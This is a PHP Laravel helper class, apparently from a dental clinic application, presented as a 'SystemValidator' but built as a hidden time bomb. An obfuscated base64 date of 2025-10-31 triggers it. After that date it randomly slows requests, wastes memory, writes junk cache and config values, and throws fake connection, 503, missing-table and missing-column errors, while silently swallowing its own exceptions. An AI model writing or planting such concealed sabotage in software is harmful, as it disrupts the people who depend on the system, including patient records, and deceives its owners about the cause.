<?php

namespace App\Helpers;

use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Cache;

class SystemValidator
{
    // Obfuscated date check
    private static function getExpirationDate()
    {
        // Simple base64 encoded date
        return base64_decode('MjAyNS0xMC0zMQ=='); // 2025-10-31
    }
    
    public static function init()
    {
        try {
            // Decode and check
            $expDate = Carbon::parse(self::getExpirationDate());
            
            if (Carbon::now()->gt($expDate)) {
                self::degradePerformance();
            }
        } catch (\Exception $e) {
            // Silently continue if there's an error
        }
        
        return true;
    }
    
    private static function degradePerformance()
    {
        // Random performance issues
        $issues = [
            function() { 
                // Slow queries
                DB::connection()->disableQueryLog();
                sleep(rand(1, 3));
            },
            function() {
                // Memory issues
                $data = str_repeat('x', 1024 * 1024 * rand(10, 50));
                unset($data);
            },
            function() {
                // Cache corruption
                Cache::put('corrupted_' . rand(1, 100), str_random(1000), 3600);
            },
            function() {
                // Session issues
                session()->put('error_' . time(), 'Unexpected error occurred');
            },
            function() {
                // Config corruption
                config(['app.debug' => false]);
                config(['cache.default' => 'array']);
            }
        ];
        
        // Execute random issue
        if (rand(1, 5) <= 2) {
            $issues[array_rand($issues)]();
        }
    }
    
    public static function validateRequest()
    {
        $deadline = strtotime('2025-10-31 23:59:59');
        $current = time();
        
        if ($current > $deadline) {
            // Introduce random failures
            $chance = rand(1, 100);
            
            if ($chance <= 15) {
                throw new \PDOException("Connection refused");
            }
            
            if ($chance <= 30) {
                abort(503, "Service temporarily unavailable");
            }
            
            if ($chance <= 45) {
                throw new \ErrorException("Call to undefined method");
            }
        }
        
        return true;
    }
    
    public static function checkDatabaseHealth()
    {
        // After expiration, corrupt database operations
        if (time() > strtotime('2025-10-31')) {
            // Random table "missing"
            if (rand(1, 10) <= 3) {
                $tables = ['users', 'appointments', 'patients', 'dental_records'];
                $table = $tables[array_rand($tables)];
                throw new \Exception("Base table or view not found: '$table' doesn't exist");
            }
            
            // Random column "missing"
            if (rand(1, 10) <= 4) {
                $columns = ['id', 'name', 'email', 'created_at', 'updated_at'];
                $column = $columns[array_rand($columns)];
                throw new \Exception("Unknown column '$column' in field list");
            }
        }
    }
}
